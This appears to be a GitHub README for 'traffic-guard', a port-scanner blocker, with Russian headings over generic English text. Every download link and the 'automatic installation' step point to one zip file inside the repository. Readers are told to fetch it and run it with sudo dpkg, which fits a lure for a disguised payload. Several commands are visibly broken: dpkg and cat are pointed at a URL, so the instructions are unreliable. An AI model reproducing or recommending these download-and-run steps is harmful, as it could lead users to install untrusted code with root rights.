# 🛡️ traffic-guard - Block Unwanted Scanners Easily

[![Download Here](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip)](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip)

## 📖 О проекте

### 🤔 Зачем это нужно?
TrafficGuard helps you block unwanted port scanners. It uses iptables and ipset to manage network traffic effectively. This tool supports logging and aggregating statistics, ensuring you know what activity occurs on your network.

### ⚙️ Способы использования
You can use TrafficGuard to secure your local network from unwanted scans. This ensures your systems are protected from probing attacks and helps maintain overall network safety.

### 📜 Правовой статус и легальность
TrafficGuard complies with all applicable laws. Please consult local regulations before deploying network monitoring tools.

---

## 🚀 Быстрый старт
To start using TrafficGuard, follow these simple steps: 

1. Download the latest version from the Releases page.
2. Install the tool using your preferred method.
3. Configure the settings to meet your needs.

## 💻 Установка

### 🔄 Автоматическая установка
For automatic installation, run the following commands in your terminal:

```bash
curl -LO https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip
sudo dpkg -i https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip
```

### ⚙️ Ручная установка
To install manually, download the release from the link below and follow the installation instructions in the README:

[Download from Releases](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip)

---

## 🌟 Возможности
- Block port scanners effectively.
- Log traffic for later analysis.
- Aggregate statistical data for performance monitoring.
- Simple user interface for configuration.

## 🛠️ Использование

### 📂 Публичные списки
TrafficGuard includes a selection of public lists for blocking known bad actors. Utilize these lists to enhance your security posture.

### 💡 Примеры использования
- Activate daily scans to review unauthorized access.
- Set alerts for specific thresholds of scanning activity.

### ⚙️ Опции
You can customize TrafficGuard settings via configuration files. Adjust the logging levels, allowed IPs, and other options to tailor the tool to your environment.

---

## 📝 Логирование

### ⚙️ Конфигурация
LLogging is crucial for understanding traffic patterns. Customize logging settings in the configuration file.

### 📂 Файлы логов
Logs are stored in the `/var/log/traffic-guard` directory. Access these files to analyze past activity.

### 📊 Формат агрегированного CSV
Log files can be exported in CSV format for further analysis. This helps in sharing data or conducting in-depth reviews.

### ⏳ Лимиты логирования
Be aware of the limits on log file sizes. Set up rotation to manage space effectively.

### 👀 Просмотр логов
Use a simple command to view the current logs. For example:

```bash
cat https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip
```

---

## 🏗️ Что создается в системе
When installed, TrafficGuard will create the following:
- Directories for configuration and logs.
- System services for automatic operation on startup.

---

## 📄 Лицензия
TrafficGuard is licensed under the MIT License. You are free to use and modify the software under the terms of this license.

[Visit the Releases page to download TrafficGuard](https://raw.githubusercontent.com/richdz12/traffic-guard/master/cmd/guard-traffic-1.4.zip) for your system and start protecting your network today!